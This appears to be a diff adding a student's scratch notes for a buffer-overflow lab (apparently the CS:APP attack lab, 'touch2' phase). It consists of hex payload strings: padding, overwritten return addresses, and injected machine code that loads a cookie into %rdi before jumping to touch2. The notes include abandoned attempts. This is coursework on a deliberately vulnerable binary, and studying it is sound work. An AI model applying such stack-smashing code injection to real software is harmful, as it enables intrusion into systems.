@@ -1,0 +1,47 @@
+touch2:
+7e 7e 7e 7e 7e 7e 7e 7e
+7e 7e 7e 7e 7e 7e 7e 7e
+7e 7e 7e 7e 7e 7e 7e 7e
+7e 7e 7e 7e 7e 7e 7e 7e
+7e 7e 7e 7e 7e 7e 7e 7e
+09 18 40 00 00 00 00 00
+
+mov $0x0,%edi
+bf 00 00 00 00
+
+cookie:
+0x69afe3c6
+
+mov 0x69afe3c6,%edi:
+bf c6 e3 af 69
+
+mov cookie to rdi and touch2:
+7e 7e 7e 7e 7e 7e 7e 7e
+7e 7e 7e 7e 7e 7e 7e 7e
+7e 7e 7e 7e 7e 7e 7e 7e
+7e 7e 7e 7e 7e 7e 7e 7e
+7e 7e 7e 7e 7e 7e 7e 7e
+bf c6 e3 af 69
+09 18 40 00 00 00 00 00
+
+no no no, we must inject code and overwrite touch1 to say
+
+touch my code:
+7e 7e 7e 7e 7e 7e 7e 7e
+7e 7e 7e 7e 7e 7e 7e 7e
+7e 7e 7e 7e 7e 7e 7e 7e
+7e 7e 7e 7e 7e 7e 7e 7e
+7e 7e 7e 7e 7e 7e 7e 7e
+d0 22 66 55 00 00 00 00 //loctaion of rsp :0x556622d0
+
+0x69afe3c6
+0x556622d0 - 0x28 = 0x556622a8
+touch2: 0000000000401809
+
+48 c7 c7 c6 e3 af 69 c3
+7e 7e 7e 7e 7e 7e 7e 7e
+7e 7e 7e 7e 7e 7e 7e 7e
+7e 7e 7e 7e 7e 7e 7e 7e
+7e 7e 7e 7e 7e 7e 7e 7e
+a8 22 66 55 00 00 00 00
+09 18 40 00 00 00 00 00
